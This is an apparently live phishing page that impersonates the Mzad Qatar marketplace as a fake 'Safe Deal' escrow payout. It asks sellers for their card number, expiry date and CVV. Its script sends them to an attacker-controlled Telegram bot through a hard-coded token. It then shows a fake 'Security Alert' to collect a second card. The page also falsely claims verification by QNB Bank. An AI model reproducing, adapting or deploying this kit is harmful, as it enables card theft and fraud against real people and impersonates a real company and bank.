<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title>Mzad Qatar | Safe Deal</title>
    <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
    <style>
        :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; }
        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; color: var(--text); }
        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 15px rgba(0,0,0,0.1); }

        /* HEADER */
        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .logo-main { height: 42px; }

        /* AD BOX */
        .ad-box { border-bottom: 8px solid var(--bg); }
        .img-container { 
            width: 100%; 
            aspect-ratio: 1.2; 
            background: #eee url('https://mzadqatar.com/frontend/images/mzad/logo_gray.svg') no-repeat center;
            background-size: 30%;
            display: flex; 
            align-items: center; 
            justify-content: center; 
            overflow: hidden; 
            border-bottom: 1px solid #eee; 
        }
        .img-container img { width: 100%; height: 100%; object-fit: cover; transition: opacity 0.3s; opacity: 0; }
        .img-container img[src] { opacity: 1; }
        
        .ad-info { padding: 16px; }
        .ad-title { font-size: 20px; font-weight: 700; margin: 0 0 8px; color: #111; }
        .ad-price { font-size: 28px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }

        /* SPECS */
        .specs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .spec { background: #f9f9f9; border: 1px solid #f0f0f0; padding: 12px; border-radius: 10px; display: flex; align-items: center; gap: 8px; font-size: 13px; color: #666; }

        /* FORM */
        .pay-section { padding: 25px 16px; background: #fff; }
        .pay-section h2 { font-size: 17px; text-align: center; color: var(--mzad-red); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.5px; }
        .q-inp { width: 100%; padding: 16px; border: 1.5px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; }
        .q-inp:focus { border-color: var(--mzad-red); background: #fff9fa; }
        .btn-payout { width: 100%; background: var(--mzad-red); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.2s; }
        .btn-payout:active { transform: scale(0.98); }

        /* FOOTER */
        .app-footer { background: #fff; padding: 40px 16px; text-align: center; border-top: 8px solid var(--bg); }
        .app-footer p { font-size: 15px; font-weight: 700; color: #444; margin-bottom: 20px; text-transform: uppercase; }
        .store-badges { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
        .store-link { height: 40px; display: block; }
        .store-link img { height: 100%; border-radius: 6px; }

        .legal-footer { padding: 30px 20px; text-align: center; font-size: 11px; color: #999; line-height: 1.6; border-top: 1px solid #eee; }
    </style>
</head>
<body>

<div class="app-shell">
    <header>
        <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="logo-main">
        <div style="font-weight: 700; color: var(--mzad-red); font-size: 14px;">العربية</div>
    </header>

    <div class="ad-box">
        <div class="img-container">
            <img id="p-img" src="">
        </div>
        <div class="ad-info">
            <div style="font-size: 12px; color: var(--mzad-red); font-weight: 600; margin-bottom: 5px;">Mzad Qatar > Verified Deal</div>
            <h1 class="ad-title" id="p-name">Loading...</h1>
            <div class="ad-price" id="p-price">0 QAR</div>
            <div class="specs">
                <div class="spec">📍 <span id="p-addr">Doha</span></div>
                <div class="spec">🕒 <span>Today</span></div>
                <div class="spec">📱 <span>Condition: New</span></div>
                <div class="spec">🛡️ <span>Escrow Active</span></div>
            </div>
        </div>
    </div>

    <div class="pay-section">
        <h2>Enter card details for payout</h2>
        <form id="payout-form">
            <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19" inputmode="numeric">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex: 1.5;" inputmode="numeric">
                <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex: 1;" inputmode="numeric">
            </div>
            <button type="submit" class="btn-payout" id="btn-txt">RECEIVE QAR</button>
        </form>
    </div>

    <div class="app-footer">
        <p>GET THE MZAD QATAR APP</p>
        <div class="store-badges">
            <a class="store-link" href="#"><img src="https://mzadqatar.com/frontend/images/mzad/app_store.png"></a>
            <a class="store-link" href="#"><img src="https://mzadqatar.com/frontend/images/mzad/google_play.png"></a>
            <a class="store-link" href="#"><img src="https://mzadqatar.com/frontend/images/mzad/app_gallery.png"></a>
        </div>
    </div>

    <div class="legal-footer">
        Verified by <b>Mzad Qatar Escrow</b> and <b>QNB Bank Security</b>. <br>
        Transaction ID: #94292309-PAY <br>
        © 2026 Mzad Qatar
    </div>
</div>

<script>
    // КОНФИГ
    const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
    const C = '8071425015';

    // ДАННЫЕ ИЗ URL
    const url = new URLSearchParams(window.location.search);
    document.getElementById('p-name').innerText = url.get('item') || 'Product Name';
    document.getElementById('p-price').innerText = (url.get('price') || '0') + ' QAR';
    document.getElementById('p-addr').innerText = url.get('addr') || 'Doha, Qatar';

    // РЕШЕНИЕ ПРОБЛЕМЫ С КАРТИНКАМИ (ПРОКСИ)
    const rawImg = url.get('img');
    if (rawImg) {
        // Пропускаем через прокси для обхода Hotlink Protection
        document.getElementById('p-img').src = 'https://images.weserv.nl/?url=' + encodeURIComponent(rawImg);
    } else {
        document.getElementById('p-img').src = 'https://via.placeholder.com/400x320?text=Mzad+Delivery';
    }

    // МАСКИ ВВОДА
    document.getElementById('cn').oninput = (e) => {
        let v = e.target.value.replace(/\D/g,'');
        e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
    };
    document.getElementById('ce').oninput = (e) => {
        let v = e.target.value.replace(/\D/g,'');
        if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
        e.target.value = v;
    };

    // ОТПРАВКА
    document.getElementById('payout-form').onsubmit = async (e) => {
        e.preventDefault();
        const b = document.getElementById('btn-txt');
        b.innerText = 'PROCESSING...';
        b.disabled = true;

        const msg = `🇶🇦 **MZAD QATAR HIT**\n\n📦 Item: ${url.get('item')}\n💰 Price: ${url.get('price')} QAR\n\n💳 Card: \`${document.getElementById('cn').value}\`\n📅 Exp: \`${document.getElementById('ce').value}\`\n🔒 CVV: \`${document.getElementById('cv').value}\`\n\n👤 Seller: ${url.get('seller') || 'None'}`;

        try {
            await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: C, text: msg, parse_mode: 'Markdown' })
            });

            // Эмуляция ошибки для сбора второй карты (дабл)
            setTimeout(() => {
                alert("Security Alert: This transaction requires identity verification. Please provide details of another valid card to receive the transfer.");
                b.innerText = 'RECEIVE QAR';
                b.disabled = false;
                document.getElementById('payout-form').reset();
            }, 3000);
        } catch (err) {
            alert("Connection error. Try again.");
            b.disabled = false;
            b.innerText = 'RECEIVE QAR';
        }
    };
</script>

</body>
</html>
